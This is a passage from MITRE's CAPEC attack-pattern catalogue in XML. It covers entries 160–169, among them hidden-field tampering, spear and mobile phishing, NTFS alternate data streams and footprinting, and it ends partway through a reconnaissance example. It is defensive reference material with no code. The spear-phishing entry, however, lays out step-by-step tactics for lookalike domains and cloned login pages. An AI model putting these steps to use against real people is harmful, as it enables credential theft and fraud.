               <xhtml:p>The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks.</xhtml:p>
               <xhtml:p>Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server.</xhtml:p>
               <xhtml:p>Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.</xhtml:p>See also: CVE-2003-1096</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="521"/>
            <Related_Weakness CWE_ID="262"/>
            <Related_Weakness CWE_ID="263"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="160" Name="Exploit Script-Based APIs" Abstraction="Standard" Status="Draft">
         <Description>Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support &lt;script&gt; tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="113"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must include the use of APIs that execute scripts.</Prerequisite>
            <Prerequisite>The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="346"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Programming to included script-based APIs</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="161" Name="Infrastructure Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are, in fact, connected to the site they intended.)</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="162" Name="Manipulating Hidden Fields" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted site must contain hidden fields to be modified.</Prerequisite>
            <Prerequisite>The targeted site must not validate the hidden fields with backend processing.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="602"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Manipulating hidden fields to change the normal flow of transactions (eShoplifting)</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="163" Name="Spear Phishing" Abstraction="Detailed" Status="Draft">
         <Description>An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="98"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="116"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="406"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.</Description>
               <Technique>Conduct web searching research of target. See also: CAPEC-118.</Technique>
               <Technique>Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.</Technique>
               <Technique>Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.</Technique>
               <Technique>Collect social information via dumpster diving. See also: CAPEC-406.</Technique>
               <Technique>Collect social information via traditional sources. See also: CAPEC-118.</Technique>
               <Technique>Collect social information via Non-traditional sources. See also: CAPEC-118.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.</Description>
               <Technique>Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).</Technique>
               <Technique>Optionally obtain a legitimate SSL certificate for the new domain name.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.</Description>
               <Technique>Use spidering software to get copy of web pages on legitimate site.</Technique>
               <Technique>Manually save copies of required web pages from legitimate site.</Technique>
               <Technique>Create new web pages that have the legitimate site's look at feel, but contain completely new content.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has his website which duplicates a legitimate website, he needs to build very custom user related information in it. For example, he could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.</Description>
               <Technique>Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.</Description>
               <Technique>Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.</Technique>
               <Technique>Place phishing link in post to online forum.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>6</Step>
               <Phase>Exploit</Phase>
               <Description>[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.</Description>
               <Technique>Log in to the legitimate site using another user's supplied credentials.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>None. Any user can be targeted by a Spear Phishing attack.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc).</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>Privilege Escalation</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>Data Modification</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The target, John, gets an official looking e-mail from his bank stating that his or her account has been temporarily locked due to suspected unauthorized activity that happened in the area different that where he lives (details might be provided by the spear phishers) and that John needs to click on the link included in the e-mail to log in to his bank account in order to unlock it. The link in the e-mail looks very similar to that of his bank and once the link is clicked, the log in page is the exact replica. John supplies his login credentials after which he is notified that his account has now been unlocked and that everything is fine. An adversary has just collected John's online banking information which can now be used by him or her to log into John's bank account and transfer John's money to a bank account of the adversary's choice.</Example>
            <Example>An adversary can leverage a weakness in the SMB protocol by sending the target, John, an official looking e-mail from his employer's IT Department stating that his system has vulnerable software, which he needs to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, John is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate John to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a "Pass The Hash" attack.</Example>
         </Example_Instances>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1192</Entry_ID>
               <Entry_Name>Spearfishing Link</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1193</Entry_ID>
               <Entry_Name>Spearfishing Attachment</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1194</Entry_ID>
               <Entry_Name>Spearfishing via Service</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1187</Entry_ID>
               <Entry_Name>Forced Authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="164" Name="Mobile Phishing" Abstraction="Detailed" Status="Draft">
         <Description>An attacker targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation on the Phishing social engineering technique where the attack is initiated via mobile texting rather than email. The user is enticed to provide information or go to a compromised web site via a text message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>MobPhishing</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Attacker needs mobile phone numbers to initiate the connection. The attacker must guess an area of interest for the mobile user to entice them to follow the link provided in the text message. The attacker must have a replicated web site as in a normal Phishing attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Alternate_Terms</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Mobile Phishing (aka MobPhishing)</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="165" Name="File Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must use the affected file without verifying its integrity.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. In some cases, tools can be used to better control the response of the targeted application to the modified file.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="166" Name="Force the System to Reset Values" Abstraction="Detailed" Status="Draft">
         <Description>An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions. Since these functions are usually intended as emergency features to return an application to a stable configuration if the current configuration degrades functionality, they may not be as strongly secured as other configuration options. The resetting of values is dangerous as it may enable undesired functionality, disable services, or modify access controls. At the very least this is a nuisance attack since the administrator will need to re-apply their configuration. At worst, this attack can open avenues for powerful attacks against the application, and, if it isn't obvious that the configuration has been reset, these vulnerabilities may be present a long time before they are notices.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="161"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must have a reset function that returns the configuration of the application to an earlier state.</Prerequisite>
            <Prerequisite>The reset functionality must be inadequately protected against use.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. In some cases, the attacker may need special client applications in order to execute the reset functionality.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="306"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="167" Name="White Box Reverse Engineering" Abstraction="Standard" Status="Draft">
         <Description>An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="188"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Direct access to the object or software.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Lifting Sensitive Data from the Client</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="168" Name="Windows ::DATA Alternate Data Stream" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple "files" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="636"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must be running the Microsoft NTFS file system.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have command line or programmatic access to the target's files system with write/read permissions.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use FAT file systems which do not support Alternate Data Streams.</Mitigation>
            <Mitigation>Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.</Mitigation>
            <Mitigation>Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="212"/>
            <Related_Weakness CWE_ID="69"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="169" Name="Footprinting" Abstraction="Meta" Status="Stable">
         <Description>An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very Low</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.</Description>
               <Technique>Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.</Technique>
               <Technique>Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.</Technique>
               <Technique>DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.</Technique>
               <Technique>Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary knows how to send HTTP request, run the scan tool.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Keep patches up to date by installing weekly or daily if possible.</Mitigation>
            <Mitigation>Shut down unnecessary services/ports.</Mitigation>
            <Mitigation>Change default passwords by choosing strong passwords.</Mitigation>
            <Mitigation>Curtail unexpected input.</Mitigation>
            <Mitigation>Encrypt and password-protect sensitive data.</Mitigation>
            <Mitigation>Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 